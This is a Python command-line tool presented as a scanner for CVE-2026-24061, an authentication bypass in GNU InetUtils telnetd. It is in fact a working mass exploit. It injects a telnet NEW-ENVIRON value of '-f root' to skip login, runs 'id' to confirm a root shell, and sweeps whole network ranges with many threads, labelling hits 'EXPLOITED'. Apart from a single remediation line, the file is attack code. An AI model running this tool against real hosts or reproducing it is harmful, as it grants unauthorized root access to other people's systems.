import argparse, ipaddress, json, socket, sys, threading, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional

R="\033[0m";BD="\033[1m";RE="\033[91m";GR="\033[92m";YE="\033[93m";BL="\033[94m";CY="\033[96m";WH="\033[97m";DM="\033[2m"
c=lambda col,t:f"{col}{t}{R}"

IAC,WILL,DO,SB,SE,NENV=0xFF,0xFB,0xFD,0xFA,0xF0,0x27

def banner():
    print(c(RE,BD+"\n  Telnetd Scanner— CVE-2026-24061 | GNU InetUtils Telnetd Auth Bypass\n"+R))
    print(c(YE,"  CVSS 9.8 Critical \n"))

def new_environ_payload(val="-f root"):
    return bytes([IAC,SB,NENV,0])+b"\x00USER\x01"+val.encode()+bytes([IAC,SE])

def do_new_environ():
    return bytes([IAC,WILL,NENV])

def strip_iac(data):
    out,i=[],0
    while i<len(data):
        b=data[i]
        if b==IAC and i+1<len(data):
            cmd=data[i+1]
            if cmd in(WILL,DO,0xFC,0xFE)and i+2<len(data):i+=3
            elif cmd==SB:
                j=data.find(bytes([IAC,SE]),i+2);i=j+2 if j!=-1 else len(data)
            else:i+=2
        else:out.append(b);i+=1
    return bytes(out).decode(errors="replace").strip()

@dataclass
class R_:
    host:str;port:int;ts:str=field(default_factory=lambda:datetime.now().isoformat(timespec="seconds"))
    reachable:bool=False;vulnerable:bool=False;exploited:bool=False;shell:str="";banner:str="";err:str=""

def probe(host,port,ctout=3.0,rtout=2.0,uval="-f root"):
    r=R_(host,port)
    try:
        s=socket.create_connection((host,port),timeout=ctout);s.settimeout(rtout)
    except:r.err="unreachable";return r
    r.reachable=True
    recv=lambda n=4096:s.recv(n) if True else b""
    def _recv(n=4096):
        try:return s.recv(n)
        except:return b""
    r.banner=strip_iac(_recv(1024))
    try:s.sendall(do_new_environ());time.sleep(0.1);s.sendall(new_environ_payload(uval));time.sleep(0.3)
    except:pass
    txt=strip_iac(_recv(2048))
    vuln=any(x in txt for x in["#","$","root@","uid=0"])
    fail=any(x in txt for x in["login:","Login:","Password:","incorrect"])
    if vuln and not fail:
        r.vulnerable=True
        try:s.sendall(b"id\n");time.sleep(0.5);o=strip_iac(_recv(1024))
        except:o=""
        if"uid="in o:r.exploited=True;r.shell=o
    elif not fail and not vuln:
        r.vulnerable=True;r.shell=txt[:200]
    try:s.close()
    except:pass
    return r

def expand(targets):
    hosts=[]
    for t in targets:
        t=t.strip()
        if not t or t.startswith("#"):continue
        try:hosts.extend(str(ip)for ip in ipaddress.ip_network(t,strict=False).hosts())
        except:hosts.append(t)
    return hosts

_lk=threading.Lock()
def log(tag,col,msg):
    with _lk:print(f"{c(DM,datetime.now().strftime('%H:%M:%S'))} {c(col,tag)} {msg}")

def run(hosts,ports,threads,uval,cto,rto,verbose):
    tasks=[(h,p)for h in hosts for p in ports]
    done,total,results=[0],[len(tasks)],[]
    lock=threading.Lock()
    def scan(host,port):
        r=probe(host,port,cto,rto,uval)
        with lock:
            done[0]+=1;pct=done[0]*100//total[0]
            print(f"\r  [{'█'*(pct//5):<20}] {pct:3d}%  {done[0]}/{total[0]}",end="",flush=True)
        if r.vulnerable:
            with _lk:
                exp=c(GR," [EXPLOITED]")if r.exploited else""
                print(f"\n  {c(RE,BD+'VULNERABLE')}{exp} {c(WH,host)}:{port}")
                if r.shell:print(f"  {c(CY,'↳')} {r.shell[:120]}")
        elif verbose:
            log("[-]"if not r.reachable else"[*]",RE if not r.reachable else BL,f"{host}:{port} — {'unreachable'if not r.reachable else'not vulnerable'}")
        return r
    log("[*]",BL,f"Scanning {total[0]} target(s) with {threads} thread(s)\n")
    t0=time.monotonic()
    with ThreadPoolExecutor(max_workers=threads)as pool:
        for f in as_completed({pool.submit(scan,h,p):(h,p)for h,p in tasks}):
            results.append(f.result())
    print();return results,time.monotonic()-t0

def report(results,path,fmt):
    vuln=[r for r in results if r.vulnerable];exp=[r for r in results if r.exploited]
    if fmt=="json":
        json.dump({"cve":"CVE-2026-24061","scan_time":datetime.now().isoformat(),"total":len(results),"vulnerable":len(vuln),"exploited":len(exp),"findings":[vars(r)for r in vuln]},open(path,"w"),indent=2)
        return
    sep="="*70;dash="-"*70
    lines=[sep,"  CVE-2026-24061 SCAN REPORT — EnvInject",sep,
           f"  Generated  : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
           f"  Scanned    : {len(results)}  Vulnerable: {len(vuln)}  Exploited: {len(exp)}",sep,""]
    for r in vuln:
        lines+=[f"  Host      : {r.host}:{r.port}",f"  Timestamp : {r.ts}",
                f"  Exploited : {'YES — root shell confirmed'if r.exploited else'POSSIBLE — verify manually'}"]
        if r.banner:lines.append(f"  Banner    : {r.banner[:80]}")
        if r.shell:lines.append(f"  Shell out : {r.shell[:120]}")
        lines.append(dash)
    lines+=["","  REMEDIATION",dash,"  Upgrade GNU InetUtils >= 2.8 | Disable telnetd | Block port 23",sep]
    open(path,"w").write("\n".join(lines)+"\n")

def main():
    banner()
    p=argparse.ArgumentParser(prog="envinject.py",description="CVE-2026-24061 Scanner")
    p.add_argument("-t","--target",action="append",metavar="HOST/CIDR")
    p.add_argument("-f","--file",metavar="FILE")
    p.add_argument("-p","--port",default="23")
    p.add_argument("--threads",type=int,default=50)
    p.add_argument("--user-value",default="-f root")
    p.add_argument("--connect-timeout",type=float,default=3.0)
    p.add_argument("--read-timeout",type=float,default=2.0)
    p.add_argument("-o","--output")
    p.add_argument("--format",choices=["txt","json"],default="txt")
    p.add_argument("-v","--verbose",action="store_true")
    a=p.parse_args()
    raw=(a.target or[])+(open(a.file).read().splitlines()if a.file else[])
    if not raw:sys.exit(c(RE,"  [!] No targets. Use -t or -f."))
    hosts=expand(raw);ports=[int(x)for x in a.port.split(",")]
    log("[*]",BL,f"Targets: {len(hosts)}  Ports: {ports}  Threads: {a.threads}  CVE: CVE-2026-24061\n")
    results,elapsed=run(hosts,ports,a.threads,a.user_value,a.connect_timeout,a.read_timeout,a.verbose)
    vuln=[r for r in results if r.vulnerable];exp=[r for r in results if r.exploited]
    print(f"\n{'─'*50}\n  {c(BD,'SCAN SUMMARY')}\n{'─'*50}")
    print(f"  Scanned   : {c(WH,str(len(results)))}\n  Reachable : {c(CY,str(sum(1 for r in results if r.reachable)))}")
    print(f"  Vulnerable: {c(RE,str(len(vuln)))}\n  Exploited : {c(GR,str(len(exp)))}\n  Elapsed   : {c(DM,f'{elapsed:.1f}s')}\n{'─'*50}\n")
    if a.output:report(results,a.output,a.format);log("[+]",GR,f"Report saved → {a.output}")

if __name__=="__main__":
    try:main()
    except KeyboardInterrupt:print(c(YE,"\n  [!] Interrupted.\n"));sys.exit(0)
